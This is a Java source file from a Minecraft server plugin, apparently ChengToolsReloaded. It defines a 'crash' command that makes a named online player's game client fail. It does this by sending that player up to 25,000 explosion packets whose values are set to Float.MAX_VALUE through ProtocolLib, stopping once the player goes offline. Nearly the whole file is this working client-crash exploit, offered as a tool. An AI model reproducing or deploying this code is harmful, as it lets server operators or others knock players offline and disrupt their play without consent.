package cn.ChengZhiYa.ChengToolsReloaded.Commands.Other;

import cn.ChengZhiYa.ChengToolsReloaded.HashMap.StringHashMap;
import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.events.PacketContainer;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import static cn.ChengZhiYa.ChengToolsReloaded.Ultis.multi.*;

public class CrashPlayerClient implements CommandExecutor {
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (sender.hasPermission("ChengTools.Crash")) {
            if (args.length == 1) {
                String PlayerName = args[0];
                if (Bukkit.getPlayer(PlayerName) == null) {
                    sender.sendMessage(getLang("PlayerNotOnline"));
                    return false;
                }

                if (StringHashMap.Get(PlayerName + "_Crash") != null) {
                    sender.sendMessage(getLang("Crash.RepeatExecution"));
                    return false;
                }
                Player player = Bukkit.getPlayer(PlayerName);
                sender.sendMessage(getLang("Crash.Execution"));
                StringHashMap.Set(Objects.requireNonNull(player).getName() + "_Crash", "崩端ing");

                PacketContainer packetContainer = new PacketContainer(PacketType.Play.Server.EXPLOSION);
                packetContainer.getModifier().writeDefaults();
                packetContainer.getFloat().write(0, (float) player.getLocation().getX());
                packetContainer.getFloat().write(1, (float) player.getLocation().getY());
                packetContainer.getFloat().write(2, (float) player.getLocation().getZ());
                packetContainer.getSpecificModifier(List.class).write(0, new ArrayList(0));
                packetContainer.getFloat().write(0, Float.MAX_VALUE);
                packetContainer.getFloat().write(1, Float.MAX_VALUE);
                packetContainer.getFloat().write(2, Float.MAX_VALUE);
                packetContainer.getFloat().write(3, Float.MAX_VALUE);
                for (int i = 0; i < 25000; i++) {
                    try {
                        ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, true);
                    } catch (InvocationTargetException ignored) {
                    }
                    if (!player.isOnline()) {
                        break;
                    }
                }
            }else  {
                sender.sendMessage(getLang("Usage.Crash", label));
            }
        } else {
            sender.sendMessage(getLang("NoPermission"));
        }
        return false;
    }
}
